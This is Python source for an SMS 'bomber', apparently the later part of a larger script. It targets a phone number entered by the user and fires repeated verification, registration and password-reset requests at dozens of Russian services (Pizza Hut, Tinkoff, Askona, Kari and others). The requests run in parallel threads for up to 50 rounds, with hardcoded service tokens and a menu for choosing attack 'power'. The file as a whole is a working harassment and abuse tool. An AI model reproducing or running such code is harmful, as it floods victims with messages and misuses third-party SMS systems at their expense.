		def pizzahut(phone, proxies):
			try:
				requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': phone, '_token':'*'})
			except Exception as e:
				print("pizzahut"+str(e))

		def livemaster(phone, user_agent, proxies):
			try:
				requests.post("https://www.livemaster.ru/auth/validatephonenumber", headers={"user-agent": str(user_agent), "x-requested-with": "XMLHttpRequest"}, data={"phoneNumber": "+"+phone})
			except Exception as e:
				print("livemaster"+str(e))

		def alltime(phone_chaev, user_agent, proxies):
			try:
				requests.post("https://www.alltime.ru/sservice/2020/form_register_phone.php", headers={"user-agent": str(user_agent), "x-requested-with": "XMLHttpRequest"}, data={"action": "send", "back": "/jewellary/", "phone": phone_chaev})
			except Exception as e:
				print("alltime"+str(e))

		def jumagazin(phone_jumagazin, user_agent, proxies):
			try:
				requests.post("https://jumagazin.ru/includes/confirm_phone.php", headers={"user-agent": str(user_agent), "x-requested-with": "XMLHttpRequest"}, data={"PHONE": phone_jumagazin, "SEND_CODE": "Y"})
			except Exception as e:
				print("jumagazin"+str(e))

		def adamas(phone_nine, user_agent, proxies):
			try:
				requests.post("https://rest.adamas.ru/v1/phone/send", headers={"user-agent": str(user_agent), "content-type": "application/json;charset=UTF-8", "origin": "https://www.adamas.ru", "referer": "https://www.adamas.ru/", "authorization": "Bearer xu7CPpdnSFGBD8gEOcHNEdxX1KvTuKXU"}, json={"phone": phone_nine, "action": "registration"})
			except Exception as e:
				print("adamas"+str(e))

		def omskuvelir(phone_omskuvelir, user_agent, proxies):
			try:
				requests.post("https://omskuvelir.ru/ajax/ajax-auth.php", headers={"user-agent": str(user_agent), "x-requested-with": "XMLHttpRequest"}, data={"phone": phone_omskuvelir, "type": "sendsms"})
			except Exception as e:
				print("omskuvelir"+str(e))

		def karatov(phone_chaev, user_agent, proxies):
			try:
				session = requests.Session()
				r = session.post("https://karatov.com/catalog/", proxies=proxies)
				if r.text[674739:674740] == '"':
					bxajaxid = r.text[674740:674772]
				else:
					bxajaxid = r.text[674739:674771]
				session.post("https://karatov.com/catalog/", headers={"Upgrade-Insecure-Requests": "1", "User-Agent": str(user_agent), "Host": "karatov.com", "Origin": "https://karatov.com", "Referer": "https://karatov.com/catalog/", "Sec-Fetch-Dest": "iframe", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1"}, data={"bxajaxid": bxajaxid, "AJAX_CALL": "Y", "page": "", "USER_LOGIN": phone_chaev, "USER_LOGIN_EMAIL": "", "TYPE": "REMEMBER", "USER_PASSWORD": "", "LOGIN_FORM": "Y", "USER_REMEMBER": "Y"})
			except Exception as e:
				print("karatov"+str(e))

		def tinkoff(phone_tinkoff, proxies):
			try:
				requests.post("https://social.journal.tinkoff.ru/api/v18/account/login/phone/", headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36 OPR/75.0.3969.279", "X-CSRFToken": "AFDWiSFN0ITImtWjyQsFbIBc778HvwdFs1WWpALeLy4HFwDFAZqgG6cOPEyxHlB2"}, json={"phone": phone_tinkoff, "point_of_contact": "header-login-button"})
			except Exception as e:
				print("tinkoff"+str(e))

		def askona(phone, user_agent, proxies):
			try:
				session = requests.Session()
				r = session.get("https://www.askona.ru/encyclopedia/kak-vybrat-divan/", proxies=proxies)
				csrf = r.text[220052:220084]
				session.get(f"https://www.askona.ru/api/registration/sendcode?csrf_token={csrf}&contact%5Bphone%5D={phone}", headers={"user-agent": str(user_agent), "x-requested-with": "XMLHttpRequest"}, params={"csrf_token": csrf, "contact[phone]": phone})
			except Exception as e:
				print("askona"+str(e))
		
		def iconjob(phone, proxies):
			try:
				requests.post("https://api.iconjob.co/api/auth/verification_code", headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36 OPR/75.0.3969.279", "x-web-session": "eyJhbGciOiJIUzI1NiJ9.eyJ3c2lkIjoxOTYyMjMxMzJ9.gyzRCpZ7lCsD4V3anEZv51Iog1OHsLJz7E9xL-OoSCs"}, json={"phone": phone})
			except Exception as e:
				print("iconjob"+str(e))

		def mtstv(phone, proxies):
			try:
				requests.post("https://api.mtstv.ru/v1/users", data={'msisdn': phone})
			except Exception as e:
				print("mtstv"+str(e))

		def findclone(phone, user_agent, proxies):
			try:
				requests.get(f"https://findclone.ru/register?phone=+{phone}", headers={"User-Agent": str(user_agent), "X-Requested-With": "XMLHttpRequest"}, params={"phone":  phone})
			except Exception as e:
				print("findclone"+str(e))

		def kari(phone, user_agent, proxies):
			try:
				requests.get(f"https://i.api.kari.com/ecommerce/client/registration/verify/phone/code?phone=%2B{phone}", headers={"User-Agent": str(user_agent), "Host": "i.api.kari.com", "Origin": "https://kari.com", "Referer": "https://kari.com/", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "keep-alive", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site"})
			except Exception as e:
				print("kari"+str(e))

		def apteka_ot_sklada(phone, user_agent, proxies):
			try:
				session = requests.Session()
				r = session.get("https://apteka-ot-sklada.ru", proxies=proxies)
				r = session.post("https://apteka-ot-sklada.ru/api/auth/requestBySms", headers={"User-Agent": str(user_agent), "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "keep-alive", "Content-Type": "application/json;charset=UTF-8", "Host": "apteka-ot-sklada.ru", "Origin": "https://apteka-ot-sklada.ru", "Referer": "https://apteka-ot-sklada.ru/"}, json={"phone": phone})
			except Exception as e:
				print("apteka-ot-sklada"+str(e))

		def tvoyapteka(phone_chaev, user_agent, proxies):
			try:
				session = requests.Session()
				r = session.get("https://www.tvoyaapteka.ru/personal/?register=yes", proxies=proxies)
				key = r.text[123910:123942]
				r = session.post("https://www.tvoyaapteka.ru/bitrix/ajax/ajax_auth_new.php", headers={"user-agent": str(user_agent), "x-requested-with": "XMLHttpRequest", "origin": "https://www.tvoyaapteka.ru", "referer": "https://www.tvoyaapteka.ru/personal/?register=yes", "accept": "text/html, */*; q=0.01", "accept-encoding": "gzip, deflate, br", "accept-language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7", "content-type": "application/x-www-form-urlencoded; charset=UTF-8"}, data={"captcha": "", "register": "1", "ajax_key": key, "name": "Буяров Вася Алексейвич", "tel": phone_chaev, "password": "python228P", "confirmmation_agreement": "python228P"})
			except Exception as e:
				print("tvoyaapteka"+str(e))

		def oodji(phone_chaev, user_agent, proxies):
			try:
				requests.post("https://www.oodji.com/ajax/phoneConfirmation.php", headers={"user-agent": str(user_agent), "x-requested-with": "XMLHttpRequest"}, data={"phone": phone_chaev, "type": "register"})
			except Exception as e:
				print("oodji"+str(e))

		#запускаем потоки 1 на 1
		threading.Thread(target=utair_2_0, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=cloudtis, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=lenta, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=re_store, args=(phone_chaev, user_agent, proxies,)).start()
		threading.Thread(target=youla, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=tvoydom, args=(phone_tvoydom, user_agent, proxies,)).start()
		threading.Thread(target=zoloto585, args=(phone_chaev, user_agent, proxies,)).start()
		threading.Thread(target=d1achcanypala0j, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=b_apteka, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=sberhealth, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=unitiki, args=(phone_unitiki, user_agent, proxies,)).start()
		threading.Thread(target=theobject, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=broniboy, args=(phone_chaev, user_agent, proxies,)).start()
		threading.Thread(target=rolf, args=(phone_chaev, user_agent, proxies,)).start()
		threading.Thread(target=mcdonalds, args=(phone_plus, user_agent, proxies,)).start()
		threading.Thread(target=delivery, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=burgerking, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=apteka_ru, args=(phone_chaev, user_agent, proxies,)).start()
		threading.Thread(target=sunlight, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=kristall, args=(phone_chaev, user_agent, proxies,)).start()
		threading.Thread(target=htv, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=savetime, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=miratorg, args=(phone_chaev, user_agent, proxies,)).start()
		threading.Thread(target=unizoo, args=(phone_unizoo, user_agent, proxies,)).start()
		threading.Thread(target=telegram, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=airsoft, args=(phone_unitiki, user_agent, proxies,)).start()
		threading.Thread(target=lvlkitchen, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=modulbank, args=(phone_nine, user_agent, proxies,)).start()
		threading.Thread(target=goldapple, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=karusel, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=mymajor, args=(phone_mymajor, user_agent, proxies,)).start()
		threading.Thread(target=citilink, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=mkb_broker, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=eda_yandex, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=oldi, args=(phone_mymajor, user_agent, proxies,)).start()
		threading.Thread(target=ICQ, args=(phone, proxies,)).start()
		threading.Thread(target=mr_cook, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=pizzahut, args=(phone, proxies,)).start()
		threading.Thread(target=livemaster, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=alltime, args=(phone_chaev, user_agent, proxies,)).start()
		threading.Thread(target=jumagazin, args=(phone_jumagazin, user_agent, proxies,)).start()
		threading.Thread(target=adamas, args=(phone_nine, user_agent, proxies,)).start()
		threading.Thread(target=omskuvelir, args=(phone_omskuvelir, user_agent, proxies,)).start()
		threading.Thread(target=karatov, args=(phone_chaev, user_agent, proxies,)).start()
		threading.Thread(target=tinkoff, args=(phone_tinkoff, proxies,)).start()
		threading.Thread(target=askona, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=iconjob, args=(phone, proxies,)).start()
		threading.Thread(target=mtstv, args=(phone, proxies,)).start()
		threading.Thread(target=findclone, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=kari, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=apteka_ot_sklada, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=tvoyapteka, args=(phone_chaev, user_agent, proxies,)).start()
		threading.Thread(target=oodji, args=(phone_chaev, user_agent, proxies,)).start()

		lap = lap + 1

		if str(lap) == "50":
			print('Прошло 50 кругов. Ваша атака остановлена!')
			sys.exit()

def nor(phone):
	for x in "\nРазработчик бомбера: 0X00077 cовместно с pr0gr1mm3r":
		print(x, end='')
		sys.stdout.flush()
		sleep(0.05)

	if phone[0] == "7":
		try:
			if phone[12] == "":
				print('Вы неправильно ввели номер!')
		except:
			phone_chaev = "+"+str(phone[0:1])+" ("+str(phone[1:4])+") "+str(phone[4:7])+"-"+str(phone[7:9])+"-"+str(phone[9:11]) #+7 (929) 920-88-31
			phone_tvoydom = "+"+str(phone[0:1])+"("+str(phone[1:4])+") "+str(phone[4:7])+"-"+str(phone[7:9])+"-"+str(phone[9:11]) #+7(929) 920-88-31
			phone_unitiki = "+"+str(phone[0:1])+"("+str(phone[1:4])+")"+str(phone[4:7])+"-"+str(phone[7:9])+"-"+str(phone[9:11]) #+7(929)920-88-31
			phone_plus = "+"+str(phone)
			phone_nine = phone[1:11] #9299208831
			phone_unizoo = "8"+" ("+str(phone[1:4])+") "+str(phone[4:7])+"-"+str(phone[7:9])+"-"+str(phone[9:11]) # 8 (929) 920-88-31
			phone_mymajor = "("+str(phone[1:4])+") "+str(phone[4:7])+"-"+str(phone[7:9])+"-"+str(phone[9:11])# (929) 920-88-31
			phone_jumagazin = "+"+str(phone[0:1])+" ("+str(phone[1:4])+") "+str(phone[4:7])+"-"+str(phone[7:9])+str(phone[9:11]) # +7 (929) 920-8831
			phone_omskuvelir = "+"+str(phone[0:1])+" ("+str(phone[1:4])+") "+str(phone[4:7])+" "+str(phone[7:9])+" "+str(phone[9:11]) # +7 (929) 920 88 31
			phone_tinkoff = "+"+str(phone[0:1])+" "+str(phone[1:4])+" "+str(phone[4:7])+" "+str(phone[7:9])+" "+str(phone[9:11]) # 7 929 920 88 31
			print("Атака запущена!")
			threading.Thread(target=service_nor, args=(phone, phone_chaev, phone_tvoydom, phone_unitiki, phone_plus, phone_unizoo, phone_nine, phone_mymajor, phone_jumagazin, phone_omskuvelir, phone_tinkoff,)).start()
	else:
		print('Вы неправильно ввели номер!')

def menu():
	for x in "\nРазработчик бомбера: 0X00077 cовместно с pr0gr1mm3r":
		print(x, end='')
		sys.stdout.flush()
		sleep(0.05)

	for x in "\nВыберите мощность":
		print(x, end='')
		sys.stdout.flush()
		sleep(0.05)

	for x in "\n1)Легендарная":
		print(x, end='')
		sys.stdout.flush()
		sleep(0.05)

	for x in "\n2)Нормальная":
		print(x, end='')
		sys.stdout.flush()
		sleep(0.05)

	a = input("\n--->> ")
	if str(a) == "1":
		phone = input("\nВведите номер --->> ")
		leg(phone)

	if str(a) == "2":
		phone = input("\nВведите номер --->> ")
		nor(phone)